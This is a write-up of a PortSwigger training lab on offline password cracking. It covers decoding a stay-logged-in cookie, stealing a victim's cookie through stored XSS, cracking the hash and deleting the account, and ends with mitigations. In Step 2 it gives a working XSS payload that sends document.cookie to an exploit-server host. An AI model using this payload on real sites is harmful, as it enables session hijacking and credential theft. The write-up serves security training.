# 🔐 PortSwigger Authentication Vulnerability Lab: Offline Password Cracking

## 🏆 Objective
The lab stores user password hashes in cookies and contains an **XSS vulnerability** in the comment functionality. Our goal is to:

✅ Obtain **Carlos's stay-logged-in cookie** 🥠  
✅ Crack his **password hash** 🔑  
✅ Log in as **Carlos** 🕵️‍♂️  
✅ **Delete his account** from the "My Account" page ❌

---

## 🚀 Step 1: Log in and Analyze the Stay-Logged-In Cookie

1. **Log in using the provided credentials:**  
   - **Username:** `wiener`  
   - **Password:** `peter`

2. **Intercept the request** using **Burp Suite** and enable the "Stay logged in" checkbox.
3. **Observe the response** and note the **stay-logged-in** cookie (usually Base64-encoded).
4. **Copy and decode** the cookie using a **Base64 decoder** to extract the stored **username and password hash**.

---

## 🎯 Step 2: Exploiting XSS to Steal Carlos’s Cookie

Since the lab has an **XSS vulnerability** in the comment section, we can inject a malicious payload to steal **Carlos’s stay-logged-in cookie**. 

### 🕵️‍♂️ XSS Payload:
```html
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

1. **Post the above payload** in the comment section.
2. **Wait for Carlos to visit** the page. Once he does, his **stay-logged-in cookie** will be sent to our exploit server.
3. **Retrieve Carlos’s cookie** from the exploit server.

---

## 🔓 Step 3: Extracting Carlos’s Password Hash

1. **Copy Carlos’s stay-logged-in cookie** and decode it using a **Base64 decoder**.
2. The decoded result will likely be in this format:
   ```plaintext
   carlos:[password_hash]
   ```
3. **Extract the hash** and use an **online hash cracking service** like **CrackStation**.
4. **Retrieve the plaintext password**. In this case:
   - **Password:** `onceuponatime`

---

## 🏁 Step 4: Logging in as Carlos & Deleting the Account

1. **Use the cracked credentials**:
   - **Username:** `carlos`
   - **Password:** `onceuponatime`
2. Navigate to **"My Account"**.
3. Click on **"Delete my account"** to successfully complete the lab. ✅

---

## 📌 Conclusion

🔹 **Client-side password storage** is **insecure** and can lead to credential theft.  
🔹 **XSS vulnerabilities** can be exploited to steal sensitive user data.  
🔹 **Mitigation strategies:**  
   - Store **passwords securely** on the **server-side**. 🔒  
   - **Avoid** storing **sensitive data** in cookies. 🍪🚫  
   - Implement **input sanitization** and **Content Security Policies (CSPs)** to prevent **XSS attacks**. 🚧  

---

⚠️ **Ethical Disclaimer:** This guide is for **educational purposes only**. Always follow ethical hacking practices and seek permission before testing security vulnerabilities. 🛡️

---

✍️ **Author:** Ankur Sharma  
📅 **Date Edited:** Today
![Picture1](https://github.com/user-attachments/assets/162d3d5b-8f9a-40bb-9d51-168a09aacded)
![Picture2](https://github.com/user-attachments/assets/b8d05267-4cf3-4adc-84a2-f23b09ad0785)
![Picture3](https://github.com/user-attachments/assets/181a4fe7-884e-4552-9c95-d42d263bbb97)
![Picture4](https://github.com/user-attachments/assets/338438d7-3a19-4b53-b592-d49856f0e1dd)
![Picture5](https://github.com/user-attachments/assets/dda8af80-036f-4dc2-acff-2df39ba88d4c)
![Picture6](https://github.com/user-attachments/assets/3277c57d-1014-429d-a467-2cb24eae0c7f)
![Picture7](https://github.com/user-attachments/assets/7ddb25a8-4742-45ce-9ec2-7ad9d9df1289)
![Picture8](https://github.com/user-attachments/assets/25971d2a-6440-4ad6-9f37-000a529273ef)

